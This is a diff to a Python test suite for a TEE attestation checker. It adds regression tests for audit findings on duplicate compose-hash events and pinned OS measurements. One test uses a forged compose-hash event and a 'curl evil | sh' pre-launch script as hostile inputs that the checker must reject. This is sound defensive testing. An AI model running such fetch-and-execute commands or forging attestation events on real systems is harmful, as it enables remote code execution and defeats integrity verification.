@@ -53,7 +53,7 @@ def failures(att, compose=COMPOSE):
 def test_a_good_attestation_passes_every_check():
     results = attest.check(make_att(), COMPOSE)
     assert all(ok is True for ok, _ in results), results
-    assert len(results) == 10
+    assert len(results) == 11
 
 
 def test_the_digest_formula_matches_dstack():
@@ -127,3 +127,28 @@ def test_the_near_ai_key_is_the_one_allowed_secret():
 def test_the_compose_label_names_the_file_checked():
     texts = [t for _, t in attest.check(make_att(), COMPOSE, compose_name="docker-compose.mainnet.yml")]
     assert "the deployed compose file is docker-compose.mainnet.yml from this repo" in texts
+
+def test_a_second_compose_hash_event_fails():  # audit #16
+    att = make_att()
+    events = json.loads(att["event_log"])
+    evil = event("compose-hash", bytes.fromhex("ee" * 32))
+    events.insert(2, evil)  # an evil hash first, the real one after it
+    body = bytearray(bytes.fromhex(att["quote"]))
+    body[48 + 472:48 + 520] = attest.replay([e["digest"] for e in events if e["imr"] == 3])
+    att.update(event_log=json.dumps(events), quote=body.hex())
+    assert any("more than once" in t for t in failures(att))
+
+
+def test_os_measurements_are_checked_against_the_pins():  # audit #14, #15
+    att = make_att()
+    m = attest.measurements(att)
+    assert m["pre_launch_script_sha256"] == "none" and len(m["mr_td"]) == 96
+    pinned = attest.check(att, COMPOSE, known={k: [v] for k, v in m.items()})
+    assert all(ok is True for ok, _ in pinned) and len(pinned) == 16
+    other = attest.check(att, COMPOSE, known={**{k: [v] for k, v in m.items()}, "mr_td": ["11" * 48]})
+    assert [t for ok, t in other if ok is False] == [f"MRTD {m['mr_td'][:16]}… is NOT one of the pinned values"]
+    script = {**att, "app_compose": json.dumps({**json.loads(APP_COMPOSE), "pre_launch_script": "curl evil | sh"})}
+    script["compose_hash"] = hashlib.sha256(script["app_compose"].encode()).hexdigest()
+    texts = [t for ok, t in attest.check(script, COMPOSE, known={k: [v] for k, v in m.items()}) if ok is False]
+    assert any(t.startswith("pre-launch script") for t in texts)
+    assert [ok for ok, t in attest.check(att, COMPOSE, known={}) if "not pinned" in t] == [None] * 5
